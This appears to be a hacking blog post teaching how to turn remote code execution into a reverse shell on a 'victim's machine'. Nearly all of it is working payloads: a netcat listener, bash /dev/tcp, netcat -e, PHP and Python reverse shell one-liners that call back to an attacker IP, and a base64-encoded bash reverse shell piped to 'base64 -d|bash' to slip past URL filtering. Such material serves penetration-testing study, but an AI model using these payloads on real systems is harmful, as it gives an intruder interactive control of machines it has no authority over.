---
layout: post
title:  "Get reverse shell with RCE"
---

## Introduction

When we are triying to pwn a machine we look for a shell connected to the victim's machine. Sometimes we can found some credentiales or RSA keys to connect via SSH. More times we can't get a SSH shell but we have some [RCE][rce].
In this article we are going to cover different ways to get a reverse shell with [RCE][rce]

Soon, in later articles we are going to be covering how to upgrade these shell's because these are not interactive, means, for example, that if we press TAB we won't get an autocompletion, we will just get a tabulation. 

Also, a good practice before try to connect a reverse shell is try to test this RCE in order to don't confuse if the reverse shell got an error, beacuse we won't know if the problem is about the RCE or the shell.

For the porpous of this post we are going to be using an Ubuntu FocalFossa machine from [osboxes.org ][osboxes]

## Concepts and notation
In order to follow this post we have to make clear some concpets and notation.
When we say $IP we mean the ip address of the attacker's machine. You can choose any port for $PORT, just remember have to be a number between 1 and 65,535. Also the port have to be free, no service have to be running. A common port used to reverse shell is 443

## From attacker's machine
In most of the cases we are going to use netcat in order to listen to the comunication
This will be the only command we execute in our attacker's machine, the rest of them will be executed on the victim's machine.

We have to run:
```bash
nc -lvnp $PORT
```
With this command we are going to be waiting for connecions at this port in our machine.

## From victim's machine
The command that we have to inject are one of those:

### Bash

This is propably the easiest way to do it.
We have to enter this command in the victim's machine

```bash
bash -i >& /dev/tcp/$IP/$PORT 0>&1
```

## Netcat

If netcat is installed in the victmim's machine we can also got a reverse shell
```bash
nc -nv $IP $PORT -e /bin/sh
nc -nv $IP $PORT -e /bin/bash
```
Either of this two commands will work.

## PHP

If we have php installed on the victim's machine we can:
```php
 php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Special cases
We just saw a few ways to get a reverse shell but sometimes we have to inject the code on an url. So there's a problem because if we try to inject the bash code we can see that there is some special characters that the web would recognize like /. We wan't to pass that command as a string, so the web can't recognize that characters.

### Encode to base64
First we have encode the command to base64.
```bash
echo $command_to_convet | base64
```
For example we are going to convert:
```bash
bash -i >& /dev/tcp/192.168.1.36/443 0>&1
```
The result:
```bash
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMzYvNDQzIDA+JjEK
```
We notice that now we dont have those special characters that were bothering us, but now we have another problem.
We can't just pass this encode string and expect the victim's machine to recognize IT.

So we have to tell it how to decode and execute, THIS IS THE FINAL URL COMMAND THAT WE HAVE TO INJECT:
```bash
echo $encode_string|base64 -d|bash
```
We just to put the previusly encoded string into the $encode_string variable




[osboxes]: https://www.osboxes.org/
[rce]: https://www.n-able.com/blog/remote-code-execution
